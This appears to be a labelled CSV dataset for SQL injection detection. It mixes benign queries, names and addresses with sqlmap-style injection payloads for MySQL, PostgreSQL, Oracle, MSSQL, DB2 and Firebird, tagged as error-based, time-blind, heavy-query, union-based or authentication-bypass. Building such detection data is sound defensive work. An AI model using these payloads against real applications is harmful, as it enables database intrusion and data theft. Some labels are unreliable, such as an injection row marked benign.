payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack
"select * from users WHERE username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" and username = ""1\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,postgresql,0.9,True
"-3361 where 1335 = 1335 or elt ( 5891 = 5092,5092 ) --","- __INT__ where __INT__ = __INT__ or __IDENT__ ( __INT__ = __INT__ , __INT__ ) - -",boolean_blind,mysql,0.7,True
"select * from users WHERE username = ""1\' ) ) ) or username = ""-2992\' ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ) and __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ),error_based,postgresql,0.85,True
"select * from users WHERE username = ""-3859 ) or username = ""-7072\' ) and username = ""1"" or username = ""1\' where 8537 = 8537",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ where __INT__ = __INT__,error_based,oracle,0.8,True
"SELECT COUNT ( acres ) , corner FROM orbit BY drive","select count ( __IDENT__ ) , __IDENT__ from __IDENT__ by __IDENT__",benign,generic,1.0,False
"1%' ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( '%' = '",__INT__ % __STR__ % __STR__,heavy_query,generic,0.85,True
"select * from users WHERE username = ""-1985 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 1248 = 1248"" and username = ""-3499\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) ) ) or __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) )",error_based,mssql,0.8,True
"1"" ) ) and make_set ( 1167 = 5027,5027 ) and ( ( ""grfi"" = ""grfi",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,mysql,0.8,True
"select * from users WHERE username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'bmhw\' like \'bmhw"" or username = ""1\' ) ) and ( ( \'mmfq\' = \'mmfq""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,boolean_blind,oracle,0.9,True
SELECT * FROM children FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ship,select * from __IDENT__ fetch first __INT__ __IDENT__ rows __IDENT__ top __INT__ * from __IDENT__,benign,mysql,0.9,False
"1"" ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""wmmg"" like ""wmmg",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,heavy_query,postgresql,0.9,True
SELECT * FROM general WHERE easy BETWEEN 10 AND 20,select * from __IDENT__ where __IDENT__ between __INT__ and __INT__,benign,mysql,0.9,False
"SELECT * FROM enter WHERE actually IN ( 'chance', 'teacher', 'beauty' )","select * from __IDENT__ where __IDENT__ in ( __STR__ , __STR__ , __STR__ )",benign,mysql,0.9,False
"1 ) ) as krzi where 8727 = 8727 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) - -",heavy_query,db2,0.7,True
1'+ ( select ijoh where 7145 = 7145 order by 1--,__INT__ + ( select __IDENT__ where __INT__ = __INT__ order by __INT__ - -,unknown,generic,0.7,True
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4","select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__",heavy_query,firebird,0.85,True
"1 ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )","__INT__ ) and __INT__ = __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) , __INT__ )",time_blind,oracle,0.9,True
"select * from users WHERE username = ""1 ) as nbno where 9816 = 9816 or username = ""-1254"" or username = ""1\' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ __INT__ where __INT__ = __INT__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,0.95,True
"SELECT Orders.sortrID, Employees.left, Employees.hurry FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.postID ORDER BY Orders.taughtID","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ order by __IDENT__",benign,generic,1.0,False
jaki,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""1%\' ) ) ) or username = ""1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-1254""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True
5.49426E+15,__IDENT__ + __INT__,benign,generic,0.9,False
ravinder,__IDENT__,benign,generic,0.9,False
-5229' ) ) as tkqp where 9253 = 9253 or 9323 = 9323#,- __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__,boolean_blind,generic,0.5,True
"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.95,True
palera,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-5863"" and username = ""1%\' ) ) ) and ( ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,auth_bypass,generic,0.6,True
"c/ don bosco 65, 10-d","__IDENT__ / __IDENT__ __IDENT__ __INT__ , __INT__ - __IDENT__",benign,generic,0.9,False
"select * from users WHERE username = ""1\'|| ( select \'vasx\' where 4770 = 4770 or username = ""1"" or username = ""-9505\' ) ) ) and ( ( ( \'qhdg\' = \'qhdg""",select * from __IDENT__ where __IDENT__ = __STR__,auth_bypass,generic,0.5,True
hatajo,__IDENT__,benign,generic,0.9,False
SELECT * FROM flag WHERE worse = 'make' FETCH FIRST 3 ROWS ONLY,select * from __IDENT__ where __IDENT__ = __STR__ fetch first __INT__ rows only,benign,mysql,0.9,False
SELECT COUNT ( betweenID ) FROM active,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
ralf,__IDENT__,benign,generic,0.9,False
"1%' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and '%' = '",__INT__ % __STR__ % __STR__,error_based,mysql,0.9,True
) or ( a = a,) or ( __IDENT__ = __IDENT__,boolean_blind,generic,0.9,True
SELECT * FROM struggle WHERE tea = forest,select * from __IDENT__ where __IDENT__ = __IDENT__,benign,generic,1.0,False
9.97465E+015,__IDENT__ + __INT__,benign,generic,1.0,False
"select * from users WHERE username = ""-7209\' ) ) ) or username = ""-1254"" or username = ""-7209\' ) ) )","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ ) ) )",auth_bypass,generic,0.6,True
raian,__IDENT__,benign,generic,0.9,False
saetero farrer,__IDENT__ __IDENT__,benign,generic,0.9,False
"1"" ) as amak where 7938 = 7938 and elt ( 1210 = 1210,sleep ( 5 ) ) --","__INT__ ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , sleep ( __INT__ ) ) - -",time_blind,mysql,0.7,True
SELECT * FROM smooth WHERE pie BETWEEN '1996-07-01' AND '1996-07-31',select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,benign,generic,1.0,False
"select * from users WHERE username = ""-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'rxzr\' = \'rxzr"" and username = ""-7710\' where 5658 = 5658","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ where __INT__ = __INT__",error_based,mssql,0.8,True
SELECT manufacturing ( s ) FROM nearest LEFT JOIN,select __IDENT__ ( __IDENT__ ) from __IDENT__ left join,benign,generic,1.0,False
"c/ codigo correspondencia oficial correos-telegrafos 71, 10d","__IDENT__ / __IDENT__ __IDENT__ __IDENT__ __IDENT__ - __IDENT__ __INT__ , __IDENT__",benign,generic,0.9,False
"select * from users WHERE username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""bwrb"" like ""bwrb""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and __STR__ like __STR__,error_based,postgresql,0.9,True
"select * from users WHERE username = ""-7072\' ) and username = ""-1254"" or username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ | | ( select \ __STR__ from dual where __INT__ = __INT__",error_based,oracle,0.85,True
SELECT * FROM sum WHERE cage = 'particular' OR lot = 'each',select * from sum where __IDENT__ = __STR__ or __IDENT__ = __STR__,benign,generic,1.0,False
SELECT Count ( * ) AS mine,select count ( * ) as __IDENT__,benign,generic,1.0,False
"SELECT INSERT ( ""W3Schools.com"", 1, 9, ""Example"" ) ;","select insert ( __STR__ , __INT__ , __INT__ , __STR__ ) ;",benign,mysql,0.9,False
"c/ cels gomis i mestre 171,","__IDENT__ / __IDENT__ __IDENT__ __IDENT__ __IDENT__ __INT__ ,",benign,generic,0.9,False
9.82891E+015,__IDENT__ + __INT__,benign,generic,1.0,False
brewer,__IDENT__,benign,generic,0.9,False
"1' and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'lywy' like 'lywy",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mysql,0.9,True
SELECT AVG ( map ) FROM forward,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
cotizada,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-1641\' ) ) and ( ( \'vgcb\' like \'vgcb"" or ( ( 5299 = 5299"" and username = ""1\' ) ) and ( ( \'rggg\' = \'rggg""",select * from __IDENT__ where __IDENT__ = __STR__ or ( ( __INT__ = __INT__ __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__,auth_bypass,generic,0.6,True
"SELECT * FROM users WHERE username = ""1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" AND username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,union_based,oracle,0.95,True
"select * from users WHERE username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and \'foju\' = \'foju"" and username = ""1 ) as nbno where 9816 = 9816",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) as __IDENT__ where __INT__ = __INT__,error_based,oracle,0.95,True
SELECT ate FROM sides UNION ALL SELECT want FROM proper ORDER BY aloud,select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by __IDENT__,benign,generic,1.0,False
1.53418E+15,__IDENT__ + __INT__,benign,generic,0.9,False
"-3697' ) ) ) union all select 5180,5180,5180,5180,5180,5180,5180--","- __INT__ ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,0.85,True
"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.9,True
"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""1\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ or __IDENT__ = __INT__ ) ) ),error_based,oracle,0.95,True
"1"" ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --","__INT__ ) and __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) - -",benign,generic,1.0,False
llombai,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-5863"" and username = ""-2679\' ) ) ) and ( ( ( \'cutk\' like \'cutk""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,auth_bypass,generic,0.6,True
"select * from users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) and username = ""1 ) as nbno where 9816 = 9816 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and ( ( ( \'mfmk\' = \'mfmk""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) as __IDENT__ where __INT__ = __INT__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - __STR__,error_based,oracle,0.95,True
rini,__IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-1641\' ) ) and ( ( \'vgcb\' like \'vgcb"" or username = ""1%\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ % __IDENT__ ) and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),boolean_blind,oracle,0.9,True
"select * from users WHERE username = ""-6523"" and username = ""-6720\' ) ) ) and username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ __STR__ ) ) ) or __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) )",error_based,oracle,0.85,True
sant celoni,__IDENT__ __IDENT__,benign,generic,0.9,False
tordera savall,__IDENT__ __IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""1"" and username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,oracle,0.85,True
"select * from users WHERE username = ""1%\' ) ) ) and username = ""1 ) as nbno where 9816 = 9816 and ( ( ( \'mfmk\' = \'mfmk""",select * from __IDENT__ where __IDENT__ = __STR__,auth_bypass,generic,0.6,True
